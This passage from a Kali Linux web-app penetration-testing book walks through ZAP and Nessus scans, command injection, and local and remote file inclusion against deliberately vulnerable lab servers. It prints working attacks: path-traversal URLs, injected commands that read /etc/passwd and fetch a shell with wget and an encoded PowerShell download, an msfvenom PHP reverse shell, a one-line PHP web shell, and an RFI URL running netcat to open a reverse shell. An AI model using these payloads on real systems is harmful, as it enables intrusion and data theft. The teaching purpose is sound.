And as you can see, ZAP found multiple issues with the website. Each folder contains different types of security issues. For now, let’s just check out the first alert, the “Path Traversal” folder. Go ahead and click to expand it, and then click on the very first alert:

![](Images/image00718.jpeg)

On the right side you will see the page that has possible issues and the level of risk:

![](Images/image00719.jpeg)

OWASP ZAP also explains the error:

“The Path Traversal attack technique allows an attacker access to files, directories, and commands that potentially reside outside the web document root directory. An attacker may manipulate a URL in such a way that the web site will execute or reveal the contents of arbitrary files anywhere on the web server. Any device that exposes an HTTP-based interface is potentially vulnerable to Path Traversal.

Most web sites restrict user access to a specific portion of the file-system, typically called the "web document root" or "CGI root" directory. These directories contain the files intended for user access and the executable necessary to drive web application functionality. To access files or execute commands anywhere on the file-system, Path Traversal attacks will utilize the ability of special-characters sequences.

The most basic Path Traversal attack uses the "../" special-character sequence to alter the resource location requested in the URL. Although most popular web servers will prevent this technique from escaping the web document root, alternate encodings of the "../" sequence may help bypass the security filters. These method variations include valid and invalid Unicode-encoding ("..%u2216" or "..%c0%af") of the forward slash character, backslash characters ("..\") on Windows-based servers, URL encoded characters "%2e%2e%2f"), and double URL encoding ("..%255c") of the backslash character.”

Basically this means that we can view files or folders on the webserver just by using a special sequence. And OWASP ZAP gives us the exact command to enter:

http://192.168.1.68/mutillidae/?page=%2Fetc%2Fpasswd

The command above will list a webpage on the Metasploitable server. If we enter this URL in a web browser on our Kali system, it will go to the Metasploitable server and pull up a certain webpage, the “?page=” part followed by the webpage to display.

The page requested in the alert is “%2Fetc%2Fpasswd”. Now this may not look like much, but if you are familiar with Linux (and encoding), the command becomes “/etc/passwd”, which is the location of the server’s password file!

Entering this entire webpage address in the Kali web browser will return this:

![](Images/image00720.jpeg)

You see what appears to be a normal web page, but if you look in the center window you see this information:

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false snmp:x:115:65534::/var/lib/snmp:/bin/false

The contents of the Linux password file – Obviously not something you want displayed on your webpage. For every alert that OWASP-ZAP finds, it also includes a solution to protect your system from the vulnerability found. As seen below:

![](Images/image00721.jpeg)

### MitM Proxy Attack

Now that we have seen the quick scan feature, let’s take a look at using the Man-in-the-Middle (MitM) proxy feature for better results. Begin by creating a New Session.

 Click “File” and then “New Session”

This will remove the collected data from the database and create a fresh slate for us to play with. Or just close ZAP and restart it.

1.  Now, open Iceweasel
2.  At the far right of the screen click the “Open Menu” button (3 lines on top of each other)
3.  Open “Preferences”, “Advanced”,  “Network”, and then click, “Settings”:

![](Images/image00722.jpeg)

4.  Click “Manual Proxy”, and set the proxy to “localhost” port “8080” and click, “OK”:

![](Images/image00723.jpeg)

Now that the Man-in-the-Middle proxy is set, surf to the Mutillidae menu (Metasploitable IP Address/mutillidae), and open up a couple pages so the man-in-the-middle intercept proxy can take a good look at them. In each one that you open, fill in the input requested, for example:

5.  Click “Owasp Top 10”
6.  From the “A1 Injection” menu choose “Command injection” and “DNS lookup”.
7.  Lookup a DNS name. You can use a local machine if you want:

![](Images/image00724.jpeg)

8.  Now from the OWASP Top 10 menu choose, “A1 Injection/ SQLi Bypass Authentication/ Login”.
9.  Go ahead and register and create an account, just use “testing” for the username and password.
10.  Now go to the login screen and login using these credentials.
11.  Notice that the user is correctly set to test at the top of the webpage:

![](Images/image00725.jpeg)

Now that we have surfed around a bit, created an account and logged in using the proxy, let’s go back to OWASP ZAP and scan the website for vulnerabilities.

12.  In the top left window under “Sites”, you will notice that the ZAP proxy lists the IP Address of our Metasploitable system.  Click on the triangle next to the IP address and then click on Mutillidae:

![](Images/image00726.jpeg)

13.  Now right click on the mutillidae folder and select, “Attack”, “Active Scan” and then “Start Scan”:

![](Images/image00727.jpeg)

ZAP will perform an in-depth scan of the page, including the new information obtained with the ZAP proxy. Go grab a cup of coffee; this will take a while.

When the scan is finished, click on the “Alerts” tab:

![](Images/image00728.jpeg)

Notice that we have several more alerts than what we had when we just did the quick start attack. One noticeable addition is the SQL Injection alerts – these were detected due to logging in to Mutillidae using the proxy.

Fuzzing with ZAP

Now let’s see how we can do some automatic fuzzing. ZAP allows us to select multiple items from the scanned page and perform a ton of different fuzzing attacks against them. Let’s see this in action.

Clicking on the SQL Injection alert reveals this:

![](Images/image00729.jpeg)

This alert reveals that the old,’ or ‘1’=’1’ SQL injection attack might work. But I wonder what else would work on the page? ZAP will test this (and a whole lot else) for you.

1.  In the “Sites” window, find the post page for the login, and click on it to highlight it:

![](Images/image00730.jpeg)

2.  Next, right click on it and select, “Attack” and then “Fuzz…”

This will open the fuzzer screen. It lists the header text in the top left box, the target query with selectable text in the bottom left box and the fuzz location/tool window on the right.

3.  In the bottom left window, highlight the username “testing”
4.  Now click “Add” in the right Window:

![](Images/image00731.jpeg)

5.  A Payloads box pops up showing the value of “testing”. Click “Add” again to select our attack payloads.
6.  In the drop down box that says ‘Type:’ select, “File Fuzzers”:

![](Images/image00732.jpeg)

7.  Now click the triangle next to “jbrofuzz” to expand the options:

![](Images/image00733.jpeg)

8.  Notice the large amount of different attack types you can use. We just want to try SQL Injection for now, so check the “SQL Injection Box”, and click “Add”.

You will now be back at the payload screen. Notice that at this point you could add multiple keywords and numerous payloads if you wanted to create a very complex attack. But for now we just want to attack the keyword username ‘testing’ with SQL Injections.

9.  Click “OK” to continue.
10.  Now just click, “Start Fuzzer” to begin:

![](Images/image00734.jpeg)

This can take a short while to run, but within a few seconds you should already see multiple SQL injection attacks and their statuses shown in the alert window:

![](Images/image00735.jpeg)

Now, just basically look through the returns to see which ones worked and which didn’t. You will notice that even though we logged in as “testing” the upper response status window in some of the returns shows something different:

![](Images/image00736.jpeg)

“Logged-In-User: admin”, Nice! When done using ZAP, don’t forget to remove the proxy settings from your web browser. As you can see OWASP ZAP makes testing websites for numerous security issues very quick and easy.

Conclusion

In this section we took a look at OWASP ZAP and learned how to complete a quick scan attack and how to use the proxy to intercept input to be able to perform more in-depth scans. We then learned how to fuzz variables from a webpage using multiple payloads making security scanning quick and easy. 

On the security defense side running a spider program against a website is a very load, noisy attack. If you open a terminal and run ‘wireshark’ while the spider is running you will see a wall of traffic going back and forth between our Kali system and the target:

![](Images/image00737.jpeg)

The constant traffic between the two systems will really stick out to a Network Security Monitoring (NSM) system. And that is why it is extremely important to monitor your network for suspicious network traffic.

Resources

 ZaProxy Wiki - [https://code.google.com/p/zaproxy/wiki/Videos](https://code.google.com/p/zaproxy/wiki/Videos)

 [https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)

## Chapter 16

## Commercial Web App Scanners

There are several commercial web application scanners available on the market. Some offer a free home user version, and many offer a time limited free trial. Though I will only show how to install and run one of them, Nessus. Installation and use is fairly similar across the board, although features vary between them and some can be modified by additional add-ins. If you are choosing one for your company, the best that I can offer is that you research your requirements and compare them to what is available. Get a trial version and try it out to see if it will meet your needs. A list of commercial scanner tools can be found at the OWASP website:

[https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools)

Later in the book we will look at multiple tools that come with Kali and are either purely open source/free or have a commercial version that you can upgrade to.

### Nessus

Nessus is not included with Kali and is a licensed program that needs to be purchased. But you can obtain a trial copy from the Nessus website to try it out. To obtain the trial of Nessus Professional, go to ([http://www.tenable.com/evaluate](http://www.tenable.com/evaluate)) and request an evaluation key.  Then Download Nessus Pro for Kali Linux from the download page, and install it:

![](Images/image00738.jpeg)

Start the Nessus process:

 Type, “/etc/init.d/nessusd start”

 And then surf to [https://kali:8834/](https://kali:8834/)

This will start the registration process:

![](Images/image00739.jpeg)

During the configuration wizard you will:

 Create a Nessus program administrator account

 Enter Product Registration (or Evail Code)

When finished, Nessus downloads updates and the latest plugins. This can take a while. When done, go ahead and login.

### Basic Scan

Let’s perform a basic scan:

 Click, “New Scan”

 Then “Basic Network Scan”

This will open the Basic Network Scan form.

Normally you would fill in information in each tab to perform a professional scan, but for a quick test just go to the “General Tab”, enter a name (I just used ‘test’) for the scan and then enter the Mutillidae’s IP address as the Target Address:

![](Images/image00740.jpeg)

Then click, “Save” and Nessus will begin scanning the target website. You can click on the scan in progress to display a status page:

![](Images/image00741.jpeg)

Click on the “Vulnerabilities” tab to view issues found:

![](Images/image00742.jpeg)

As you can see in the picture above, Nessus found 113 vulnerabilities. Notice several are backdoors or “gain a shell remotely” - something that you would never want to find on your network! Clicking on an individual item displays an in-depth explanation of the issue, and how to solve it.

Let’s take a quick look at the Critical vulnerability, “Rogue Shell Backdoor Detection”:

![](Images/image00743.jpeg)

According to this message there is a rogue backdoor called “wild_shell” at port 1524 operating on the Metasploitable system. How could we check to see if that is true? Netcat!

Netcat is a wonderful Swiss Army like tool that is useful in so many different ways. Simply open a Terminal, run Netcat and add the target IP address and port as seen below:

 ![](Images/image00744.jpeg)

As you can see, we took the information returned to us from our Nessus scan and were able to able to prove the issue exists by simply running Netcat. 

One last information tab to look at before me move on is the “Remediation” tab. This section offers additional advice on rectifying vulnerabilities:

![](Images/image00745.jpeg)

Web Application Testing

The Basic scan revealed basic server issues that affected our target. Let’s scan Mutillidae again, but this time we will look for Web App vulnerabilities. We will also change some of the additional options to get a deeper scan.

 Create a new scan

 Click, “Web Application Tests”

 Under the General tab- Enter test name (Test2) and IP address of target

 Under Assessment - Set Scan Type to “Scan for all web vulnerabilities (complex)”:

![](Images/image00746.jpeg)

This deeper complex scan will scour the Mutillidae system looking for issues.

 Finally click, “Save” to start the scan.

![](Images/image00747.jpeg)

You can perform more advanced scans in Nessus by including website credentials and login request scripts. This helps in finding SQL injection and scripting issues. We will not be covering this, but later will look at others ways to test for SQL Injection vulnerabilities using Burp Suite.

Conclusion

As we have shown with Nessus, commercial scanning solutions can be very easy to install and use with Kali Linux. Again, I highly suggest that you research your company’s needs/ requirements and research on your own to find the solution that best matches your needs.

# WebApp Pentesting

## Chapter 17

## Command Injection

The OWASP Top 10 Project is a compilation of the top threats that face web applications. According to their website it is “A list of the 10 Most Critical Web Application Security Risks”. Mutillidae includes these vulnerabilities and allows you to practice exploiting them, gaining experience on security testing and secure coding practices

In this chapter we will learn about the Command Injection vulnerability and see how we can trick a webpage that allows input to run system commands on the actual webserver. Command injection on a vulnerable website allows us to append a system command to the end of legitimate input. For this chapter we will be using Mutillidae  from both our Windows 7 and Metasploitable VMs so we can see the vulnerability from both a Windows and Linux environment. We will practice learning command injection using the Mutillidae DNS lookup page.

 Boot up your Windows 7 & Metasploitable VMs

 Open Iceweasel in Kali

 Surf to the Windows 7 Mutillidae:

![](Images/image00748.jpeg)

From the Mutillidae main menu, select the menu select option, OWASP 2013 > A1-Injection (Other) > Command Injection>DNS Lookup and we will see the DNS lookup page:

![](Images/image00749.jpeg)

Under normal use, you enter a website name or IP address and it performs a DNS lookup and returns the requested information. So if we put in “Google.com” and click “Lookup DNS” we see:

Non-authoritative answer:

Name:              google.com

Address: 74.125.226.7

Name:              google.com

Address: 74.125.226.1

Name:              google.com

Address: 74.125.226.0

Name:              google.com

Address: 74.125.226.3

Name:              google.com

Address: 74.125.226.2

Name:              google.com

A website vulnerable to Command injection means that the web app is not written to filter or validate our input, allowing us to append and run system commands. This is usually done by using the “&”, “&&” or “|” symbol to append a command and the “;” to separate multiple commands. Let’s try this against our own router address and see if we can get the directory of the webserver by using the “dir” command. I will use just a single “&” as a separator. If your target is a Linux server, just use “ls” instead of “dir”.

My router address is 192.168.1.1\. If I do a DNS record lookup on that IP I see a simple record returned:

![](Images/image00750.jpeg)

![](Images/image00751.jpeg)

Now let’s add a system command to see if we can trick the webserver into giving up any information:

 Enter, “192.168.1.1 & dir”

![](Images/image00752.jpeg)

As expected, this immediately returns the DNS information for my router. But it also returns a directory listing of Mutillidae on the webserver:

![](Images/image00753.jpeg)

Now we in fact know that this web app is vulnerable to command injection and we also know the current working directory of the server. We can basically run any command that we want. This is true in both the Windows and Linux versions of the website.

So for example, on our Metasploitable Mutillidae VM, we could grab a list of users by using “192.168.1.1  & cat /etc/passwd”:

![](Images/image00754.jpeg)

This dutifully dumps the user list from the system passwd file:

![](Images/image00755.jpeg)

We can combine commands together using a “;” on Linux systems or additional “&”’s on Windows targets. For example on the Windows 7 Mutillidae if we want to “cd” to the root and perform a “dir” command:

 Enter, “192.168.1.1 & cd \ & dir”

![](Images/image00756.jpeg)

This correctly changes to the root and performs a directory listing:

Volume in drive C has no label.

Volume Serial Number is CC53-BFFC

Directory of C:\

06/10/2009  05:42 PM                24 autoexec.bat

06/10/2009  05:42 PM                10 config.sys

11/07/2007  09:00 AM            17,734 eula.1028.txt

11/07/2007  09:00 AM            17,734 eula.1031.txt

11/07/2007  09:00 AM            10,134 eula.1033.txt

11/07/2007  09:00 AM            17,734 eula.1036.txt

11/07/2007  09:00 AM            17,734 eula.1040.txt

11/07/2007  09:00 AM               118 eula.1041.txt

11/07/2007  09:00 AM            17,734 eula.1042.txt

11/07/2007  09:00 AM            17,734 eula.2052.txt

11/07/2007  09:00 AM            17,734 eula.3082.txt

11/07/2007  09:00 AM             1,110 globdata.ini

11/07/2007  09:03 AM           562,688 install.exe

Running Windows System and Network Commands

We are not just limited to directory commands; we can run almost any system command that doesn’t require additional input.

For Example:

 Computer Users - “192.168.1.1 & net user”:

![](Images/image00757.jpeg)

 Network Configuration - “192.168.1.1 & ipconfig”:

Windows IP Configuration

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . :

   Link-local IPv6 Address . . . . . : cd34::f72c:d2c8:f376:456d%12

   IPv4 Address. . . . . . . . . . . : 192.168.1.93

   Subnet Mask . . . . . . . . . . . : 255.255.255.0

   Default Gateway . . . . . . . . . : 192.168.1.1

 Network List - “192.168.1.1 & net view”:

Server Name                             Remark

----------------------------------------------

\\AMDServer

\\AMDWorkstation

The command completed successfully.

You simply enter a generic IP address to look up, and attach system commands to the end of it. The webserver that is vulnerable to command injection will return command responses right in the webpage.

### Remote Shell from Command Injection

Now let’s see how we can use command injection to upload and run a PHP based shell. Once the shell is executed we will get a full remote session to the target website.

We will do so by using the following steps:

1.  Create the shell on your Kali system
2.  Copy the shell to our Kali system’s Webserver directory
3.  Transfer the shell from our Kali Webserver over to the Target website via command injection
4.  Execute the shell remotely

This section could be a little confusing; some readers may want to read through it first before trying the individual steps.

Creating shell & Handler

We need to create a reverse PHP shell file so that when it is copied up to the server and opened from a browser, it causes the server to connect back to our Kali system. We will also need to set up a Meterpreter listener in Metasploit to listen for the connection. Let’s go ahead and create the PHP shell using msfvenom.

7.  In a terminal type, “msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.39 LPORT=4444 -f raw > shell.php”

![](Images/image00758.jpeg)

For the payload we chose the PHP based Meterpreter reverse shell. We set the IP address of the Kali system and the port we want to use. We also set the output as raw and saved the output to a file called shell.php. This creates our PHP shellcode file.

As we know by now, msfvenom doesn’t add the “<?php” tag to the beginning and “?>” to the end of the code. We will have to add these tags manually to get it to work correctly.

8.  Open the shellcode file in a text editor and add the tags as seen below:

![](Images/image00759.jpeg)

9.  Save the file in the root directory.

Copy the PHP Shell to the Local Kali Webserver

Next we will host this file on Kali’s built in local web server. The file will need to be copied to the “/var/www/html/” directory:

10.  Type, “mv shell.php /var/www/html/shell.txt”

Notice we change the extension from .php to .txt as some webservers will not allow you to upload .php files (But some browsers will correctly recognize the .txt file and process it as a .php file.)

Now we need to start the Metasploit Multi-Handler and set it to receive the incoming PHP shell.

11.  Start Metasploit by typing, “msfconsole” in a terminal.
12.  Start the Multi-Handler:

 use exploit/multi/handler

 set payload php/meterpreter/reverse_tcp

 set LHOST 192.168.1.39

 set LPORT 4444

 exploit

This will start the reverse handler as seen below:

![](Images/image00760.jpeg)

13.  Open a second Terminal and start the Kali Apache HTTP server, “service apache2 start”

Transferring the Shell to the Webserver

Now with our Kali webserver running all we need to get the shell over to the Mutillidae website. This is quite different to do if your target is Linux compared to Windows. I will show you techniques for both, Linux first and then Windows:

![](Images/image00761.jpeg)

Okay this is really easy to do if the target website is Linux (our Metasploitable VM):

 Back in the Mutillidae DNS Lookup screen in our Kali Browser we want to copy the file from the Kali webserver (192.168.1.39 in this example) to the target webserver by typing, “192.168.1.1 & wget 192.168.1.39/shell.txt”:

![](Images/image00762.jpeg)

Then to make sure it is uploaded okay type, “192.168.1.1 & ls”:

robots.txt

secret-administrative-pages.php

set-background-color.php

set-up-database.php

shell.txt

show-log.php

site-footer-xss-discussion.php

source-viewer.php

styles

 Rename the shell back to .php, by typing, “192.168.1.1 & mv shell.txt shell.php”

 If you want, you can list the directory contents again to make sure it is correct on the webserver with the ls command. You should see the file is now a PHP file again:

robots.txt

secret-administrative-pages.php

set-background-color.php

set-up-database.php

shell.php

show-log.php

site-footer-xss-discussion.php

source-viewer.php

styles

![](Images/image00763.jpeg)

This is not quite as easy in Windows, as there is no “wget” command. There are several ways we can do this, but let’s use Command Injection to inject a PowerShell download command! 

The code to download a file from Kali to the target via Powershell:

(New-Object System.Net.WebClient).DownloadFile( "http://192.168.1.39/shell.txt", "c:\xampp\htdocs\mutillidae\shell.php" )

Now this won’t work if we just put it into the DNS website lookup webpage. But, it will work if we encode the PowerShell command! If you remember how we did this in the PowerShell chapter, we will simply follow the same directions.

1.  Copy the PowerShell command and paste it into a blank text document:

![](Images/image00764.jpeg)

2.  Now Base64 encode the text file:

![](Images/image00765.jpeg)

3.  Take the encrypted text and add “powershell -ep bypass -enc ” to the beginning of it:

powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYw…

4.  Return to our Mutillidae DNS Lookup page:

![](Images/image00766.jpeg)

5.  Now in the Hostname Lookup box:
    1.  Enter “192.168.1.1 & ” and then,
    2.  Paste in the entire  PowerShell encrypted command:

![](Images/image00767.jpeg)

6.  Click “Lookup DNS”

The website will process for a second or two and then return a screen that looks something like this:

![](Images/image00768.jpeg)

It says “results for” and echoes the entire command that we entered in, but it doesn’t say if the shell was successfully uploaded or not. But if we go to the Windows 7 system and do a directory of the Mutillidae directory, we see our shell:

robots-txt.php

robots.txt

secret-administrative-pages.php

set-background-color.php

set-up-database.php

shell.php

show-log.php

Notice that we directly uploaded the file as “shell.php” where on the Linux target (if you read through that section) we had to upload the file as a “.txt” file and then rename it to “.php”. The reason is that using PowerShell we downloaded the file directly from our Kali Webserver to the local system, bypassing the “.php” file download restrictions of the Windows Webserver.

Okay, that was probably pretty confusing. Let’s take a second and recap what we have done so far. We learned that we can enter system commands into a webpage that is command injection vulnerable. We then saw how to host a Metasploit backdoored PHP shell on our Kali system and send it to vulnerable target websites, both Linux and Windows.

With the PHP shell now downloaded onto the target webservers, all we need to do is surf to the location of the shell and it will execute.

Execute the Shell Remotely

We should still have our Metasploit Handler window open in Kali and running. In IceWeasel on your Kali system execute the PHP shell file by surfing to the file on either (or both) versions of Mutillidae.

 Enter, “[Windows or Metasploitable IP]/mutillidae/shell.php”:

![](Images/image00769.jpeg)

The Webpage loading sign will spin for a while, but if we look in our Kali Metasploit window we see this:

![](Images/image00770.jpeg)

Session 1 opened!  We have successfully created and uploaded a remote shell to a vulnerable webserver using Command Injection and now have an open Meterpreter shell.

Type help to see what commands are available:

![](Images/image00771.jpeg)

Type, “sysinfo” to see the operating system that we are connected to:

![](Images/image00772.jpeg)

And there you have it, we can use any of the available Meterpreter commands or if we want we can type “shell” to open a remote terminal:

![](Images/image00773.jpeg)

Success!

Conclusion

In this section we covered quite a lot of ground. We learned what command injection is and how it works. We saw how to append commands to vulnerable web page input allowing us to run commands on the actual web server. We then saw how to create and upload a remote shell to the server. There are multiple remote shells available with different capabilities. We used Metasploit’s PHP reverse_tcp shell, but we could have uploaded any PHP shell that we wanted.

Hopefully in this section you have seen why it is important to validate all input in a Web App to prevent hackers from running commands on your web server, or even creating a remote shell to it. Only allow the type of input text that you want and block all others. Meaning if you want only a text string as input, do not allow numbers or special characters. Conversely, if looking for numerical input, don’t allow any letters or symbols as input.

## Chapter 18

## LFI and RFI

Local File Inclusions (LFI) and Remote File Inclusions (RFI) are vulnerabilities in webpages that allow a malicious user to manipulate the webpage URL to either gain access directly to folders and files on the server (LFI) or connect out to a malicious external site to run code (RFI). We will be demonstrating both using the Mutillidae web application in Metasploitable.

Surf to Mutillidae (Metasploitable2 IP/mutillidae) in your browser and double check that the security level is set to “0 (Hosed)” as shown below:

![](Images/image00774.jpeg)

First we will look at LFI, work through a few examples, and then learn about RFI. 

### Local File Inclusion (LFI)

LFI or file path transversal allows an attacker to access other directories on the server that they normally shouldn’t have access to. In mutillidae, navigate to OWASP Top Ten/ A4 - Insecure Direct Object References/ Arbitrary File Inclusion. You are greeted with the following message:

“Notice that the page displayed by Mutillidae is decided by the value in the "page" variable. The "page" variable is passed as a URL query parameter. What could possibly go wrong?”

Let’s go over this in a little more depth. Notice in the address bar the URL that we are at ‘/mutillidae/index.php?page=arbitrary-file-inclusion.php’ contains a “?page =” command. Whatever page that is listed after this command is the page that will be displayed.

Let’s see what happens if we manually manipulate the command. In the address bar replace the current page name with ‘home.php’:

![](Images/image00775.jpeg)

When you hit enter the website “home” page will show up. If the web server application is vulnerable to LFI you will be able to also access the underlying webserver by doing nothing more than using directory navigation commands. In essence, to perform an LFI we simply manipulate the called page name in an attempt to access information on the server itself.

So what would happen if we entered the previous directory location (../) in the address bar?

http://192.168.1.68/mutillidae/index.php?page=../

![](Images/image00776.jpeg)

This didn’t seem to do anything except throw an error message. But if you read the error message it reveals a bit about the underlying webserver directory layout. We are running commands out of /var/www/mutillidae/. So if we wanted to access the root directory we would need to back out of several directories.

For instance, what if we wanted to try to view a user list from the /etc/passwd file? In theory we would need to use several “../” previous directory commands to back out of the webserver directory and then put in the location of the local file we want to access. The image below demonstrates this technique:

![](Images/image00777.jpeg)

Notice the first part is the normal URL request, but instead of using an existing page, we put in our LFI attempt. If you surf to this modified URL you should see a copy of the web server’s passwd file:

![](Images/image00778.jpeg)

You won’t be able to crack passwords without also obtaining the protected -shadow file in the same directory, but you will at least get a list of users. I wonder what other information could be accessible on a server vulnerable to LFI?

Robots.txt, Config files & other Interesting Information

Robots.txt is used to keep search engines from spidering parts of the webpages that you may not want them to search and publicly index. This file can sometimes point to interesting information on a webserver. Using LFI we can view the robot.txt file on mutillidae. Simply surf to ‘mutillidae/robots.txt’:

![](Images/image00779.jpeg)

Notice that several interesting looking directories exist. System configuration files and documentation can really help an attacker gain very useful information about your network and how it is configured. In the listing you can see that the mutillidae designers have thrown us a bone by including a “passwords” directory. We would be remiss if we didn’t look there first.

Go ahead and surf to ‘mutillidae/passwords/’:

![](Images/image00780.jpeg)

As you can see there is an “accounts.txt” file present. I wonder what it contains. Click on it and you will see the following:

1.  'admin', 'adminpass', 'Monkey!!!
2.  'adrian', 'somepassword', 'Zombie Films Rock!!!
3.  'john', 'monkey', 'I like the smell of confunk
4.  'ed', 'pentest', 'Commandline KungFu anyone?'

Oh look, usernames and passwords! We even have a signature tag line at the end for each user. You would think this would rarely happen in real life, but I have seen some very un-secure practices over the years, including:

 Login credentials listed on web app login page.

 Sensitive documents posted in public web directories.  

Phpinfo.php is another interesting file if you can gain access to it. It contains a lot of configuration information about PHP. If we try to run ‘mutillidae/phpinfo.php’ we see:

![](Images/image00781.jpeg)

As you can see, if your website is vulnerable to LFI an attacker could access a lot of sensitive information from your server. A list of additional files that contain interesting information to the security tester (and a lot more) can be found on Mubix Website at:

[https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List](https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List)

In defending against this attack some website coders will take the page name supplied and append a “.php” extension to the end automatically, thinking that this will stop these kinds of attacks. So in essence, if an attacker entered, “/etc/passwd” the webserver would automatically change this to “/etc/passwd.php”. This of course would cause a page not found error. But this is not an effective defensive technique as if you put a null byte “%00” at the end (/etc/passwd%00) it will process the null byte as an end of file name thus nullifying the addition of “.php”.

### Remote File Inclusion (RFI)

Now let’s take a quick look at RFI. The technique is similar to LFI, except instead of trying to gain access to local system information, we will try to get the webserver to access a script on an external website. It would seem that RFI is no longer a viable way to attack websites as even on the Mutillidae “purposefully vulnerable” webapp, you need to enable remote URL inclusion in the PHP.ini file (see Mutillidae install chapter) just to get it to work!

We can see a simple example of RFI by inserting a call to Google from the Mutillidae site by inserting “http://www.google.com/” as a page reference:

![](Images/image00782.jpeg)

As you can see, the Google search page has been inserted into our Mutillidae site! This is a pretty serious flaw as an attacker can reference any external site, including ones that contain malicious code that will be executed on the target web server. An example of a malicious RFI URL would look like this:

![](Images/image00783.jpeg)

In the picture above, the first part is the legitimate website target prefix, while part 2 is our evil remote inclusion that we are trying to get to run. There are numerous shell programs out there that you can download and use to get a remote shell on an RFI vulnerable system. But let’s take a look at getting a remote shell using Netcat.

### Remote File Inclusion to Shell

Last year, Chris Andrè Dale demonstrated an interesting SANS Video Contest video on local File Inclusion to Shell ([https://www.youtube.com/watch?v=jEU8w3h1u1o](https://www.youtube.com/watch?v=jEU8w3h1u1o)). We will use a similar technique to quickly get a shell using remote file inclusion.

First we need to create an evil PHP program and store it on our Kali system. I am not sure who originally made the simple PHP shell code below, but it seems to be a pretty common piece of PHP code used with RFI vulnerabilities and it will work well for us:

<?php

echo "Command: ".htmlspecialchars($_GET['cmd']);

system($_GET['cmd']);

?>

Create a text file containing this code and save this in your Kali /var/www/ directory (make sure the Apache Web service is running). I named mine “thisone.txt”. Basically this PHP script tells the computer to run whatever command is sent to it via a “cmd” variable.

We will be opening a Netcat session with the target system, so we need to create a Netcat listener session on our Kali box.

 Open a terminal in Kali and type, “nc -l -v -p 4444”

![](Images/image00784.jpeg)

Then all we need to do from our Kali system is visit the target website and call our script in the URL, like so:

http://192.168.1.68/mutillidae/index.php?cmd=nc 192.168.1.39 4444 -e /bin/bash&page=http://192.168.1.39/thisone.txt

 The “http://192.168.1.68/mutillidae/index.php” part is the target website.

 The “?cmd=nc 192.168.1.39 4444 -e /bin/bash” part is a command that creates an “nc” or “Netcat” session (a remote shell) back to the Kali system.

 And lastly the “&page=http://192.168.1.39/thisone.txt” part tells the target webserver to use the malicious PHP script I created back on my local Kali webserver to process the command.

In Kali, when we surf to the URL above:

![](Images/image00785.jpeg)

The target webserver should instantly open a Netcat remote shell session from it to our attacking Kali system!

![](Images/image00786.jpeg)

If I type “whoami” I get the user name “www-data” and “pwd” returns “/var/www/mutillidae”. So we could basically remote manage the target system right through the browser, and the target webserver would think we were the website “www-data” account!

RFI can be a lot of fun to play with, but again realize that most PHP powered websites nowadays have “allow_url_include” (which makes this attack possible) set to “off” by default in the php.ini file. Though I have seen webapp programmers do some strange things over the years, including giving full read/ write access to publicly accessible directories. So this setting may be turned on if they are trying to get something specific to run in their application.

Conclusion

In this section we learned some common and fun techniques to attack web pages using file inclusions. If these vulnerabilities are present it is rather trivial to pull information from these systems and possibly even get a full remote shell. This is why it is so important to write secure code when creating web applications and also why companies should test their web apps for security vulnerabilities.

Resources

 [https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List](https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List)

 [https://pentestlab.wordpress.com/2012/06/29/directory-traversal-cheat-sheet/](https://pentestlab.wordpress.com/2012/06/29/directory-traversal-cheat-sheet/)

## Chapter 19

## Fimap

Fimap is a quick and easy to use tool that looks for Local and Remote File Inclusion issues. Not only does it scan a target for file inclusion vulnerabilities, it also allows you to spawn a remote shell! For this example we will use the Metasploitable VM and will use Mutillidae’s “Command Injection” vulnerability page as a target.

Author: Iman Karim (fimap.dev@gmail.com)

Website:  [https://tha-imax.de/git/root/fimap](https://tha-imax.de/git/root/fimap)

Quick Commands:

 Help: fimap -h

 Scan Single URL: fimap -s -u [Target URL including webpage to scan]

 Exploit page: fimap -s -u [Target URL including webpage to scan]  -x

Basic Scanning

To perform a basic Fimap scan, open a terminal prompt and enter the following command:

fimap -s -u http://192.168.1.68/mutillidae/index.php?page=dns-lookup.php

